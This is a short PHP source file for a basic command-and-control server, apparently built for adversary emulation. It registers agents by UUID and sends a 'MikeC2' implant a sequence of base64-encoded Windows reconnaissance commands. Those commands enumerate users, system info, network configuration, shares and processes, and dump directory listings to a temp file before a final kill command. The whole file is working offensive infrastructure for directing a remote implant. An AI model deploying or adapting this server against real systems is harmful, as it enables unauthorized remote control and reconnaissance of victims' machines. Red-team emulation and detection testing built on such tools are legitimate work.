<?php
# A very basic C2 server designed to send commands to the MikeC2 agent

$emulation_plan   = [];

# Some basic situational awareness 
$emulation_plan[] = "whoami";
$emulation_plan[] = "dir C:\Users";
$emulation_plan[] = "systeminfo";
$emulation_plan[] = "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum";
$emulation_plan[] = "ipconfig /all";
$emulation_plan[] = "netsh interface show";
$emulation_plan[] = "arp -a";
$emulation_plan[] = "nbtstat -n";
$emulation_plan[] = "net config";
$emulation_plan[] = "tree /F >> %temp%\\download";
$emulation_plan[] = "net share";
$emulation_plan[] = "tasklist";
$emulation_plan[] = "dir /s \"c:\\Documents and Settings\" >> %temp%\\download";
$emulation_plan[] = "dir /s \"c:\\Program Files\\\" >> %temp%\\download";

# Kill the C2 agent
$emulation_plan[] = "kill";



if(isset($_POST['uuid']) && !empty($_POST['uuid']))
{
    # If an agent specifies a UUID, send the emulation plan step by step
    session_id($_POST['uuid']);
    session_start();

    if(!isset($_SESSION['step']))
    {
        $_SESSION['step'] = 0;
    }

    $json_arr = [];
    $json_arr['uuid'] = $_POST['uuid'];
    $json_arr['cmd']  = base64_encode($emulation_plan[$_SESSION['step']]);

    $_SESSION['step']++;

    print_r( json_encode($json_arr) );
}
else
{
    # New C2 agent checkin, generate a UUID to track the agent
    $uuid = getUUID();
    $json_arr['uuid'] = $uuid;
    print_r( json_encode($json_arr) );
}



function getUUID()
{
    # Generate a random uuid
    # https://stackoverflow.com/questions/2040240/php-function-to-generate-v4-uuid
    $uuid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));
    return $uuid;
}



?>
